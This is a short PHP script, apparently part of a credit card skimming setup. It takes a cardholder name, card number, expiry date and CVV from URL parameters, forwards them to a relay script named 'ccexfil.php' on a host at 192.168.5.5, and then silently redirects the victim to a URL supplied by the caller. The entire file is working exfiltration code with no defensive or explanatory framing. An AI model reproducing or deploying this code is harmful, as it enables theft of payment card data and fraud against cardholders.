<?php
if(isset($_GET['ccnm']) and isset($_GET['ccno']) and isset($_GET['ccex']) and isset($_GET['cccv'])) {
    $ccnm = htmlspecialchars(strip_tags($_GET['ccnm']));
    $ccno = htmlspecialchars(strip_tags($_GET['ccno']));
    $ccex = htmlspecialchars(strip_tags($_GET['ccex']));
    $cccv = htmlspecialchars(strip_tags($_GET['cccv']));
    $url = 'http://192.168.5.5:80/ccexfil.php?ccnm=' . $ccnm . '&ccno=' . $ccno . '&ccex=' . $ccex . '&cccv=' . $cccv;
    file_get_contents($url);
}
if(isset($_GET['redir'])) {
    $redir = htmlspecialchars(strip_tags($_GET['redir']));
    if(filter_var($redir, FILTER_VALIDATE_URL)) {
        echo '<meta http-equiv="Refresh" content="0; url=' . $redir . '" />';
    }
}
?>
